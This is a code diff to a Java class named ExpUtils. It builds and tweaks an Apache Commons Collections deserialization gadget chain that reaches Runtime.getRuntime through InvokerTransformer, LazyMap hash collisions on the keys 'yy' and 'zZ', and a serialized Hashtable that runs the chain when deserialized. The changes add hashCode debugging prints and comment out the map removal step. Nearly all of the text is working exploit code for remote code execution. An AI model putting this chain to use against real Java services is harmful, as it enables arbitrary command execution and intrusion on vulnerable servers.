@@ -171,6 +171,10 @@ public class ExpUtils {
     public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException, NoSuchMethodException, InstantiationException, InvocationTargetException {
         System.out.println(System.getProperty("java.version"));
 
+//        Objects.equals(a,v)
+
+        System.out.println("1".hashCode());
+
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
@@ -187,21 +191,23 @@ public class ExpUtils {
 
         Map innerHashMap1 = new HashMap();
         Map innerHashMap2 = new HashMap();
-        LazyMap lazyMap1 = (LazyMap) LazyMap.decorate(innerHashMap1, getEvilChainedTransformer());
-        LazyMap lazyMap2 = (LazyMap) LazyMap.decorate(innerHashMap2, getEvilChainedTransformer());
-
+        Map lazyMap1 = LazyMap.decorate(innerHashMap1, chainedTransformer);  // 生成了LazyMap  不可反序列化的map
         lazyMap1.put("yy",1);
-        lazyMap2.put("zZ",2);
+        System.out.println("lazyMap1 hashCode:" + lazyMap1.hashCode());
+        System.out.println(innerHashMap1.hashCode());
+        Map lazyMap2 = LazyMap.decorate(innerHashMap2, chainedTransformer);
+        lazyMap2.put("zZ",1);
+        System.out.println("lazyMap2 hashCode:" + lazyMap2.hashCode());
 
         Hashtable objectObjectHashtable = new Hashtable();
-        objectObjectHashtable.put(lazyMap1,1);
-        objectObjectHashtable.put(lazyMap2,2);
+        objectObjectHashtable.put(lazyMap1,3);
+        objectObjectHashtable.put(lazyMap2,4);
 
         ReflectUtils.setFields(chainedTransformer,"iTransformers", transformers);
-        lazyMap2.remove("yy");
+//        lazyMap2.remove("123");
         String path =  serialize(objectObjectHashtable);
         Hashtable obj = (Hashtable) unserialize(path);
-        System.out.println(obj);
+//        System.out.println(obj);
 
     }
 }
